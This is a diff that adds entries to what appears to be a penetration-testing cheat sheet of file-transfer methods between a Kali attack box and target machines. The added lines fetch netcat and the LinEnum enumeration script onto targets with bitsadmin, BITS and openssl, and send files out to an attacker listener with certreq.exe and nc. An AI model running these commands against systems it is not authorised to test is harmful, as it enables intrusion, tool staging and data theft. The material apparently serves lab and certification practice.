@@ -925,6 +925,14 @@ C:\> scp C:\Temp\exploit.exe <user>@<IP address>:/tmp/exploit.exe
 C:\> scp /tmp/exploit.sh <user>@<IP address>:/tmp/exploit.sh
 ```
 
+- OpenSSL Download (Kali -> Linux)
+
+```
+$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+$ openssl s_client -connect <IP address>:80 -quiet > LinEnum.sh
+```
+
 - OpenSSL Encrypted Download (Kali -> Linux)
 
 ```
@@ -1120,6 +1128,15 @@ $ cat <&3
 
 ```
 C:\> bitsadmin /transfer n http://<IP address>/exploit.exe C:\Temp\exploit.exe
+PS C:\> bitsadmin /transfer wcb /priority foreground http://<IP address>:8000/nc.exe C:\Users\Administrator\Desktop\nc.exe
+PS C:\> Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP address>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
+- CertReq (https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) (Windows -> Kali)
+
+```
+C:\> certreq.exe -Post -config http://<IP address>:8000/ c:\Temp\exploit.exe
+$ sudo nc -lvnp 8000
 ```
 
 - Certutil (Kali -> Windows)
